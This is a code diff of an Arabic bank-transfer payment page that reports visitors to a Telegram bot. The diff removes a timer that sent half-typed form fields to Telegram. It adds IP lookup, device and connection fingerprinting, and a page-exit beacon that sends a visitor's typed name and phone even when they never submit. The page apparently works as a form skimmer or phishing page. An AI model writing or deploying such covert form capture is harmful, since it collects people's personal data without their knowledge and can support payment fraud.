@@ -63,7 +63,7 @@
                     </div>
                     <div class="text-right">
                         <h2 class="font-bold text-lg">تحويل بنكي</h2>
-                        <p class="text-xs text-gray-400">حساب بنكي مباشر (بنك القاهرة)</p>
+                        <p class="text-xs text-gray-400">بنك القاهرة (حساب مباشر)</p>
                     </div>
                 </div>
                 <i class="fas fa-chevron-left text-gray-400"></i>
@@ -285,50 +285,71 @@
 
         let currentWalletKey = '';
         let hasLoggedPageVisit = false;
+        let isPaymentCompleted = false;
+        let clientIp = 'جاري الجلب...';
 
-        let draftTimer = null;
-        let lastSentDraft = "";
-
-        function setupDraftTracker() {
-            const fields = ['sender-name', 'sender-phone', 'sender-whatsapp', 'transfer-method', 'transfer-time'];
-            fields.forEach(id => {
-                const el = document.getElementById(id);
-                if (el) {
-                    el.addEventListener('input', triggerDraftSend);
-                    el.addEventListener('change', triggerDraftSend);
-                }
-            });
+        // جلب عنوان الـ IP للعميل عند فتح الصفحة
+        async function fetchClientIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                clientIp = data.ip;
+            } catch(e) {
+                clientIp = 'غير معروف';
+            }
         }
 
-        function triggerDraftSend() {
-            clearTimeout(draftTimer);
-            draftTimer = setTimeout(() => {
-                const senderName = document.getElementById('sender-name').value.trim();
-                const phone = document.getElementById('sender-phone').value.trim();
-                const whatsapp = document.getElementById('sender-whatsapp').value.trim();
-                const method = document.getElementById('transfer-method').value;
-                const transferTime = document.getElementById('transfer-time').value.trim();
+        // دالة تحديد نوع الجهاز
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "كمبيوتر / جهاز مكتبي";
+            if (/android/i.test(ua)) device = "أندرويد (Android)";
+            else if (/iphone|ipad|ipod/i.test(ua)) device = "آبل (iOS / iPhone)";
+            else if (/tablet/i.test(ua)) device = "جهاز لوحي (Tablet)";
+            return `${device}`;
+        }
 
-                if (!senderName && !phone && !whatsapp && !transferTime) return;
-
-                const currentDataStr = `${senderName}|${phone}|${whatsapp}|${method}|${transferTime}`;
-                if (currentDataStr === lastSentDraft) return; 
-                lastSentDraft = currentDataStr;
-
-                const draftText = `📝 [بيانات مؤقتة / مسودة قيد الكتابة]\n\n` +
-                                  `👤 اسم المحول: ${senderName || 'غير مكتوب'}\n` +
-                                  `📱 هاتف التحويل: ${phone || 'غير مكتوب'}\n` +
-                                  `💬 واتساب العميل: ${whatsapp || 'غير مكتوب'}\n` +
-                                  `💳 الطريقة: ${method}\n` +
-                                  `⏰ التوقيت: ${transferTime || 'غير مكتوب'}`;
-
-                logTelegramAlert(draftText);
-            }, 5000);
+        // دالة تحديد نوع الاتصال (داتا أم واي فاي)
+        function getConnectionType() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return "غير متوفر بالمتصفح";
+            
+            let typeDesc = conn.type || conn.effectiveType || "غير معروف";
+            if (conn.type === 'cellular') {
+                typeDesc = "بيانات المحمول (Mobile Data)";
+            } else if (conn.type === 'wifi') {
+                typeDesc = "واي فاي (WiFi)";
+            } else if (conn.effectiveType) {
+                // في الغالب الـ 4g/5g تعبر عن الموبايل داتا والـ wifi يظهر أحياناً
+                typeDesc = `شبكة (${conn.effectiveType}) - قد تكون بيانات محمول أو واي فاي سريع`;
+            }
+            return typeDesc;
         }
 
         window.onload = function() {
-            setupDraftTracker();
+            fetchClientIP();
         };
+
+        // تتبع مغادرة الصفحة إذا قام العميل بكتابة بيانات ولم يُكمل الدفع
+        window.addEventListener('beforeunload', function(event) {
+            const senderName = document.getElementById('sender-name').value.trim();
+            const phone = document.getElementById('sender-phone').value.trim();
+
+            if ((senderName || phone) && !isPaymentCompleted) {
+                const text = `🚪 [تنبيه: العميل أضاف بيانات وغادر الصفحة دون إتمام]\n\n` +
+                              `👤 اسم المحول المُدخل: ${senderName || 'غير مكتوب'}\n` +
+                              `📱 الهاتف المُدخل: ${phone || 'غير مكتوب'}\n\n` +
+                              `🌐 عنوان الـ IP: ${clientIp}\n` +
+                              `💻 نوع الجهاز: ${getDeviceInfo()}\n` +
+                              `📶 نوع الاتصال: ${getConnectionType()}`;
+
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const payload = JSON.stringify({ chat_id: CHAT_ID, text: text });
+                
+                // استخدام sendBeacon أو fetch مع keepalive لضمان الإرسال عند الاغلاق
+                navigator.sendBeacon ? navigator.sendBeacon(url, new Blob([payload], {type: 'application/json'})) : fetch(url, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: payload, keepalive: true });
+            }
+        });
 
         window.showPage = function(pageId) {
             document.querySelectorAll('div[id^="page-"]').forEach(el => el.classList.add('hidden-page'));
@@ -340,7 +361,7 @@
 
             if (pageId === 'page-confirm' && !hasLoggedPageVisit) {
                 hasLoggedPageVisit = true;
-                logTelegramAlert("👁 [تنبيه زائر موقع]: قام شخص بفتح صفحة 'تأكيد التحويل'.");
+                logTelegramAlert(`👁 [تنبيه زائر موقع]: قام شخص بفتح صفحة 'تأكيد التحويل'.\n🌐 IP: ${clientIp}\n💻 الجهاز: ${getDeviceInfo()}`);
             }
         }
 
@@ -357,7 +378,7 @@
         window.selectBankTransferMethod = function() {
             document.getElementById('transfer-method').value = 'تحويل بنكي';
             showPage('page-confirm');
-            logTelegramAlert("🏦 [اختيار تحويل بنكي]: المستخدم انتقل لصفحة تفاصيل التحويل البنكي.");
+            logTelegramAlert("🏦 [اختيار تحويل بنكي]: المستخدم انتقل لصفحة تفاصيل التحويل البنكي بنك القاهرة.");
         }
 
         window.copyBankInfo = function(text, label) {
@@ -458,7 +479,18 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', fileInput.files[0]);
-                formData.append('caption', `🛡️ [تأكيد الدفع النهائي]\n\n👤 المستفيد: ياسر محمد\n🏷️️ اسم المحول: ${senderName}\n📱 هاتف التحويل: ${phone}\n💬 واتساب العميل: ${whatsapp}\n💳 طريقة التحويل: ${method}\n⏰ توقيت التحويل: ${transferTime}`);
+                formData.append('caption', 
+                    `🛡️ [تم إتمام عملية الدفع بنجاح!]\n\n` +
+                    `👤 المستفيد: ياسر محمد\n` +
+                    `🏷 اسم المحول: ${senderName}\n` +
+                    `📱 هاتف التحويل: ${phone}\n` +
+                    `💬 واتساب العميل: ${whatsapp}\n` +
+                    `💳 طريقة التحويل: ${method}\n` +
+                    `⏰ توقيت التحويل: ${transferTime}\n\n` +
+                    `🌐 عنوان الـ IP: ${clientIp}\n` +
+                    `💻 نوع الجهاز: ${getDeviceInfo()}\n` +
+                    `📶 نوع الاتصال: ${getConnectionType()}`
+                );
 
                 const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -467,6 +499,7 @@
                 const tgData = await tgRes.json();
 
                 if (tgData.ok) {
+                    isPaymentCompleted = true; // تعيين أن العملية تمت بنجاح لمنع إرسال تنبيه المغادرة
                     showToast("تم اتمام عملية الدفع بنجاح! شكراً لك.");
                     setTimeout(() => {
                         document.getElementById('sender-name').value = '';
